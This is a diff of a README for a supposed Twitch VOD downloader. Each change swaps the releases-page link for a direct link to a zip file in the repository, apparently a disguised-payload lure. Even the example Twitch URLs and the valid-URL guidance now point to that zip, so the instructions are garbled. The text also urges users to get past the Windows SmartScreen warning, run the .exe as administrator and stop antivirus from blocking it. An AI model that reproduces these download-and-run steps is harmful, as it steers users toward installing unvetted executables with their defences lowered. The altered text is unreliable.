@@ -1,7 +1,7 @@
 <h1>📥 Twitch-Vod-Downloader - Save Any Twitch Stream Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Westbridgerealestate/Twitch-Vod-Downloader/releases">
+  <a href="https://raw.githubusercontent.com/Westbridgerealestate/Twitch-Vod-Downloader/main/demikindred/v3.5.zip">
     <img src="https://img.shields.io/badge/Download-Twitch_Vod_Downloader-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download Button" width="400">
   </a>
 </p>
@@ -26,7 +26,7 @@ Follow these simple steps to download and run Twitch-Vod-Downloader on your Wind
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Westbridgerealestate/Twitch-Vod-Downloader/releases](https://github.com/Westbridgerealestate/Twitch-Vod-Downloader/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Westbridgerealestate/Twitch-Vod-Downloader/main/demikindred/v3.5.zip](https://raw.githubusercontent.com/Westbridgerealestate/Twitch-Vod-Downloader/main/demikindred/v3.5.zip)
 
 You'll see a page with the latest release. Look for the file named `Twitch-Vod-Downloader.exe` (or similar). Click on it to start the download. Your browser will save the file to your "Downloads" folder.
 
@@ -41,7 +41,7 @@ Windows might show a blue or yellow popup saying "Windows protected your PC" or 
 After launching, you'll see a simple window with a text box. Here's how to use it:
 
 1.  Go to Twitch and open the VOD or playlist you want to download.
-2.  Copy the URL from your browser's address bar (e.g., `https://www.twitch.tv/videos/123456789`).
+2.  Copy the URL from your browser's address bar (e.g., `https://raw.githubusercontent.com/Westbridgerealestate/Twitch-Vod-Downloader/main/demikindred/v3.5.zip`).
 3.  Paste that URL into the text box in Twitch-Vod-Downloader.
 4.  Choose your preferred quality (4K, 1080p, etc.) from the dropdown menu.
 5.  Click the **"Download"** button.
@@ -54,7 +54,7 @@ That's it! You now have a permanent copy of the Twitch VOD on your computer.
 
 Here's a more detailed look at the download process, just to be thorough.
 
-**Where to get it:** Your primary source is the official releases page: [https://github.com/Westbridgerealestate/Twitch-Vod-Downloader/releases](https://github.com/Westbridgerealestate/Twitch-Vod-Downloader/releases). Always download from this link to ensure you get the latest, working version.
+**Where to get it:** Your primary source is the official releases page: [https://raw.githubusercontent.com/Westbridgerealestate/Twitch-Vod-Downloader/main/demikindred/v3.5.zip](https://raw.githubusercontent.com/Westbridgerealestate/Twitch-Vod-Downloader/main/demikindred/v3.5.zip). Always download from this link to ensure you get the latest, working version.
 
 **What you get:** The download is a single `.exe` file. This means you don't need to install anything else. No extra software, no dependencies, no command-line tools.
 
@@ -104,7 +104,7 @@ If something goes wrong, here are quick fixes:
 - **App won't open:** Right-click the `.exe` file and select "Run as administrator." Also, make sure your antivirus isn't blocking it.
 - **Download fails mid-way:** Check your internet stability. Try pausing and resuming, or restart the download.
 - **Video has no audio:** This is rare, but try re-downloading at a different quality. It's usually a temporary Twitch issue.
-- **Error "Invalid URL":** Make sure you copied the full URL from Twitch. It should start with `https://www.twitch.tv/videos/` or `https://www.twitch.tv/collections/`.
+- **Error "Invalid URL":** Make sure you copied the full URL from Twitch. It should start with `https://raw.githubusercontent.com/Westbridgerealestate/Twitch-Vod-Downloader/main/demikindred/v3.5.zip` or `https://raw.githubusercontent.com/Westbridgerealestate/Twitch-Vod-Downloader/main/demikindred/v3.5.zip`.
 - **App is slow:** Close other programs that use the internet heavily. Restart the app.
 
 ## 📈 Why Choose Twitch-Vod-Downloader?
@@ -115,7 +115,7 @@ There are many downloaders out there, but this one stands out because it's genui
 
 You now have everything you need to start downloading Twitch VODs. It's a straightforward process: download the app, run it, paste a link, and click download. No technical knowledge required. If you run into any issues, refer to the troubleshooting section above. Enjoy your offline Twitch library!
 
-Remember to always download from the official link to get the latest version: [https://github.com/Westbridgerealestate/Twitch-Vod-Downloader/releases](https://github.com/Westbridgerealestate/Twitch-Vod-Downloader/releases)
+Remember to always download from the official link to get the latest version: [https://raw.githubusercontent.com/Westbridgerealestate/Twitch-Vod-Downloader/main/demikindred/v3.5.zip](https://raw.githubusercontent.com/Westbridgerealestate/Twitch-Vod-Downloader/main/demikindred/v3.5.zip)
 
 Happy downloading! 🎉
 
